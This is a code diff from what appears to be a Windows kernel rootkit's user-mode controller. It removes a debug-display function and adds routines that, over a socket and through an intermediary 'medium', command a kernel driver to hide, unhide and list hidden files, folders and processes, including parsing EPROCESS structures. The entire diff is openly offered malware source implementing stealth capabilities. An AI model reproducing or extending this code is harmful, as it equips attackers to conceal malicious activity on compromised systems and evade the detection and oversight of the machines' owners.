@@ -40,55 +40,6 @@ PVOID GetModuleBaseRootkKMD(const char* ModuleName, SOCKET tosock) {
 }
 
 
-// Display debug message from kernel mode - 
-BOOL DisplayStringFromKMD(const char* Message, SOCKET tosock, const char* ModuleName, ROOTKIT_UNEXERR Err) {
-	ROOTKIT_MEMORY RootkInstructions = { 0 };
-	RootkInstructions.Operation = RKOP_DSPSTR;
-	char InitFail = 1;
-
-	printf("\n=====DisplayStringFromKMD=====\n");
-
-	// Pass arguments for the operation to the medium -
-	if (Err != successful) {
-		SendData(tosock, &InitFail, sizeof(InitFail), FALSE, 0);
-		printf("LOG: Could not pass data to medium - INITIAL ERROR :(\n");
-		printf("=========================\n\n");
-		return FALSE;
-	}
-
-	if (!PassString(tosock, Message)) {
-		printf("LOG: Could not pass the string to display in debug (%s) to medium :(\n", Message);
-		printf("=========================\n\n");
-		return FALSE;
-	}
-	RootkInstructions.MdlName = Message;
-
-	BOOL Res = PassArgs(&RootkInstructions, tosock, TRUE);
-	if (!Res) {
-		printf("LOG: Display message string in debug failed (passing/receiving struct) :(\n");
-		printf("=========================\n\n");
-		return FALSE;
-	}
-
-
-	// Parse the results of the operation -
-	PrintUnexpected(RootkInstructions.Unexpected);
-
-	if (RootkInstructions.Unexpected != successful) {
-		printf("LOG: Display message string in debug failed (Unexpected error inside medium) :(\n");
-		printf("=========================\n\n");
-		return FALSE;
-	}
-
-	else {
-		PrintStatusCode(RootkInstructions.StatusCode);
-		printf("LOG: Printed to WinDbg the next string: %s :)\n", Message);
-		printf("==============================\n\n");
-		return TRUE;
-	}
-}
-
-
 // Read from kernel memory - 
 bool ReadFromRootkKMD(PVOID ReadAddress, PVOID DstBuffer, ULONG64 BufferSize, const char* ModuleName, SOCKET tosock, ROOTKIT_UNEXERR Err) {
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
@@ -262,7 +213,7 @@ static BOOL ValidateInfoTypeString(const char* InfoType) {
 		return FALSE;
 	}
 
-	std::string cppString("rbptcPiemCIL");
+	std::string cppString("rbptcPieIL");
 	for (int i = 0; InfoType[i] != '\0'; i++) {
 		if (cppString.find(InfoType[i]) == std::string::npos) {
 			return FALSE;
@@ -456,4 +407,215 @@ PVOID SpecAllocRootkKMD(PVOID AllocAddress, ULONG64 AllocSize, const char* Modul
 	printf("SUCCESS: Allocation for address %p concluded :)\n", RootkInstructions.Out);
 	printf("\n===========================\n");
 	return RootkInstructions.Out;
+}
+
+
+BOOL HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus) {
+	ROOTKIT_MEMORY RootkInstructions = { 0 };
+	PASS_DATA OprStatus = { 0 };
+	DWORD PathLength = 0;  // Length of path in GENERAL MEMORY (strlen * 2, not including 
+	WCHAR CurrentHidden[1024] = { 0 };
+	WCHAR* HiddenFiles = NULL;
+	int CurrentIndex = 0;
+	printf("=====HideFileOrFolder=====\n\n");
+	RootkInstructions.Operation = RKOP_HIDEFILE;
+
+
+	// Pass initial string:
+	if (!PassString(tosock, ModuleName)) {
+		printf("LOG: Could not pass allocation module name (%s) to medium :(\n", ModuleName);
+		printf("==========================\n\n");
+		return FALSE;
+	}
+
+
+	// Pass status of type of file manipulation:
+	OprStatus = SendData(tosock, &RequestStatus, sizeof(NTSTATUS), FALSE, 0);
+	if (OprStatus.err || OprStatus.value != sizeof(NTSTATUS)) {
+		printf("LOG: Could not perform manipulations of files/folders (passing/receiving errors) :(\n");
+		printf("==========================\n\n");
+		return FALSE;
+	}
+
+
+	// Pass preprocessing parameters (if needed) and set struct values:
+	switch (RequestStatus) {
+	case HIDE_FILEFOLDER:
+		PathLength = (lstrlenW(FilePath) + 1) * sizeof(WCHAR);
+		OprStatus = SendData(tosock, &PathLength, sizeof(DWORD), FALSE, 0);
+		if (OprStatus.err || OprStatus.value != sizeof(DWORD)) {
+			printf("LOG: Could not perform manipulations of files/folders (passing/receiving errors) :(\n");
+			printf("==========================\n\n");
+			return FALSE;
+		}	
+		OprStatus = SendData(tosock, FilePath, PathLength, FALSE, 0);
+		if (OprStatus.err || OprStatus.value != PathLength) {
+			printf("LOG: Could not perform manipulations of files/folders (passing/receiving errors) :(\n");
+			printf("==========================\n\n");
+			return FALSE;
+		}
+		RootkInstructions.Reserved = (PVOID)HIDE_FILE;
+		break;
+	case UNHIDE_FILEFOLDER:
+		RootkInstructions.Reserved = (PVOID)RemoveIndex;
+		break;
+	default:
+		RootkInstructions.Reserved = (PVOID)SHOW_HIDDEN;
+
+	}
+
+
+	// Pass all of the arguments of the operation to the medium:
+	BOOL Res = PassArgs(&RootkInstructions, tosock, TRUE);
+	if (!Res) {
+		printf("LOG: Could not perform manipulations of files/folders (passing/receiving errors) :(\n");
+		printf("==========================\n\n");
+		return FALSE;
+	}
+
+
+	// Parse results of operation:
+	PrintStatusCode(RootkInstructions.StatusCode);
+	PrintUnexpected(RootkInstructions.Unexpected);
+	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
+		printf("RESPONSE: Could not perform manipulations of files/folders - did not succeed :(\n");
+		printf("\n===========================\n");
+		return FALSE;
+	}
+	
+
+	// Parse output for specific requests:
+	if (RequestStatus == SHOWHIDDEN_FILEFOLDER) {
+		if (RootkInstructions.Size == 0) {
+			printf("RESPONSE: Could not perform manipulations of files/folders - listing request returned list with size of 0 bytes :(\n");
+			printf("\n===========================\n");
+			return FALSE;
+		}
+		HiddenFiles = (WCHAR*)malloc(RootkInstructions.Size);
+		if (HiddenFiles == NULL) {
+			printf("RESPONSE: Could not perform manipulations of files/folders - could not allocate memory for list :(\n");
+			printf("\n===========================\n");
+			return FALSE;
+		}
+		OprStatus = RecvData(tosock, RootkInstructions.Size, HiddenFiles, FALSE, 0);
+		if (OprStatus.err || OprStatus.value != RootkInstructions.Size) {
+			printf("Error in system info might have been because medium could not receive the size of the buffer\n");
+			printf("\n===========================\n");
+			return FALSE;
+		}
+		printf("Currently hidden files (dynamically):\n");
+		for (int bufferi = 0; bufferi < RootkInstructions.Size / sizeof(WCHAR); bufferi++) {
+			if (HiddenFiles[bufferi] == '|') {
+				wprintf(L"%s\n", CurrentHidden);
+				WideResetString(CurrentHidden);
+				CurrentIndex = 0;
+			}
+			else {
+				CurrentHidden[CurrentIndex] = HiddenFiles[bufferi];
+				CurrentIndex++;
+			}
+		}
+	}
+	printf("RESPONSE: Manipulations of files/folders succeeded :)\n");
+	printf("\n===========================\n");
+	return TRUE;
+}
+
+
+BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus) {
+	ROOTKIT_MEMORY RootkInstructions = { 0 };
+	PASS_DATA OprStatus = { 0 };
+	PVOID HiddenProcesses = NULL;
+	BYTE CurrentProcess[EPROCESS_SIZE] = { 0 };
+	int CurrentIndex = 0;
+	printf("=====HideProcess=====\n\n");
+	RootkInstructions.Operation = RKOP_HIDEPROC;
+
+
+	// Pass initial string:
+	if (!PassString(tosock, ModuleName)) {
+		printf("LOG: Could not pass allocation module name (%s) to medium :(\n", ModuleName);
+		printf("=====================\n\n");
+		return FALSE;
+	}
+
+
+	// Pass status of type of process manipulation:
+	OprStatus = SendData(tosock, &RequestStatus, sizeof(NTSTATUS), FALSE, 0);
+	if (OprStatus.err || OprStatus.value != sizeof(NTSTATUS)) {
+		printf("LOG: Could not perform manipulations of processes (passing/receiving errors) :(\n");
+		printf("=====================\n\n");
+		return FALSE;
+	}
+
+
+	// Pass preprocessing parameters (if needed) and set struct values:
+	switch (RequestStatus) {
+	case HIDE_PROCESS:
+		RootkInstructions.MainPID = (USHORT)ProcessId;
+		RootkInstructions.Size = 0;
+		break;
+	case UNHIDE_PROCESS:
+		if (RemoveIndex != -1) {
+			RootkInstructions.SemiPID = (USHORT)RemoveIndex;
+		}
+		RootkInstructions.MainPID = (USHORT)ProcessId;
+		RootkInstructions.Size = 1;
+		break;
+	default:
+		RootkInstructions.Size = 2;
+		break;
+	}
+
+
+	// Pass all of the arguments of the operation to the medium:
+	BOOL Res = PassArgs(&RootkInstructions, tosock, TRUE);
+	if (!Res) {
+		printf("LOG: Could not perform manipulations of processes (passing/receiving errors) :(\n");
+		printf("=====================\n\n");
+		return FALSE;
+	}
+
+
+	// Parse results of operation:
+	PrintStatusCode(RootkInstructions.StatusCode);
+	PrintUnexpected(RootkInstructions.Unexpected);
+	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
+		printf("RESPONSE: Could not perform manipulations of processes - did not succeed :(\n");
+		printf("=====================\n\n");
+		return FALSE;
+	}
+
+
+	// Parse output for specific requests:
+	if (RequestStatus == SHOWHIDDEN_PROCESS) {
+		if (RootkInstructions.Size == 0) {
+			printf("RESPONSE: Could not perform manipulations of processes - listing request returned list with size of 0 bytes :(\n");
+			printf("=====================\n\n");
+			return FALSE;
+		}
+		HiddenProcesses = (WCHAR*)malloc(RootkInstructions.Size);
+		if (HiddenProcesses == NULL) {
+			printf("RESPONSE: Could not perform manipulations of processes - could not allocate memory for list :(\n");
+			printf("\n===========================\n");
+			return FALSE;
+		}
+		OprStatus = RecvData(tosock, RootkInstructions.Size, HiddenProcesses, FALSE, 0);
+		if (OprStatus.err || OprStatus.value != RootkInstructions.Size) {
+			printf("Error in system info might have been because medium could not receive the size of the buffer\n");
+			printf("\n===========================\n");
+			free(HiddenProcesses);
+			return FALSE;
+		}
+		printf("Currently hidden processes (dynamically):\n");
+		for (int hiddeni = 0; hiddeni < RootkInstructions.Size / EPROCESS_SIZE; hiddeni++) {
+			RtlCopyMemory(CurrentProcess, (PVOID)((ULONG64)HiddenProcesses + (hiddeni * EPROCESS_SIZE)), EPROCESS_SIZE);
+			printf("Process number %d -\n", hiddeni);
+			ParseEprocess(CurrentProcess);
+		}
+	}
+	printf("RESPONSE: Manipulations of files/folders succeeded :)\n");
+	printf("\n===========================\n");
+	free(HiddenProcesses);
+	return TRUE;
 }
